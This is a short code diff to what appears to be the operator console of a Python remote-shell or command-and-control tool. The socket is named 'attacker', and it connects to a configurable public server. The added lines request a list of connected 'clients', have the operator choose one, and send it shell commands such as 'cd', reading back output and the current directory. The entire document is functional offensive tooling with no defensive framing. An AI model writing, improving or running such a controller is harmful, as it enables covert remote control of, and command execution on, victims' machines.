@@ -5,6 +5,7 @@ PORT = 0  # Replace 0 With Your Port Number
 SERVER = "localhost"  # Replace localhost With Your Public IP
 FORMAT = 'utf-8'
 ADDR = (SERVER, PORT)
+clients = []
 
 attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 attacker.connect(ADDR)
@@ -34,8 +35,25 @@ def recieve():
             return result
 
 
-clientnum = input("select client: ")
-send(clientnum + "<?ATTACKER?>cd")
+send("<?ATTACKER?>getclients")
+getclients = recieve()
+print("online clients: ")
+
+for c in getclients.split("<c>"):
+    if c:
+        print(c.replace("<>", " "))
+
+for c in getclients.split("<c>"):
+    if len(c.split("<>")) > 1:
+        client, junk = c.split("<>")
+        clients.append(client)
+
+while True:
+    clientnum = input("select client: ")
+    if clientnum in clients:
+        send(clientnum + "<?ATTACKER?>cd")
+        break
+
 recieved = recieve()
 output, cwd = recieved.split("<sep>")
 while True:
